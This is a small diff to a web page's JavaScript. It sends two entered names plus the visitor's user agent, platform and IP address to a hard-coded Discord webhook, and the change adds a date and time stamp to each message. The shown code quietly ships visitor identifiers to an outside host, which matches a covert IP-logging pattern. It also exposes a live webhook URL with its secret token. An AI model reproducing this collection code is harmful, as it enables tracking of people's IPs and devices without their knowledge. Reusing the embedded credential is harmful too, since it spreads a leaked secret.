@@ -69,6 +69,9 @@
             var request = new XMLHttpRequest();
             request.open("POST", "https://discord.com/api/webhooks/1185878974086250516/rx-Zk4AiQfRWdpbiEQR2bVx8m6LKUteAsDE9lDObu-0x0mYhbAH-ZX8pCyIUqfH-CCij"); // Replace with your actual webhook URL
             request.setRequestHeader('Content-type', 'application/json');
+            var currentDate = new Date();
+            var formattedDate = currentDate.toLocaleDateString();
+            var formattedTime = currentDate.toLocaleTimeString();
             var params = {
                 content: `
 **Name 1:** ${data.name1}
@@ -78,6 +81,7 @@
                     - User Agent: ${data.deviceInfo.userAgent}
                     - Platform: ${data.deviceInfo.platform}
                     - IP Address: ${data.deviceInfo.ipAddress}
+**Date and Time:** ${formattedDate} ${formattedTime}
                 `
             };
             request.send(JSON.stringify(params));
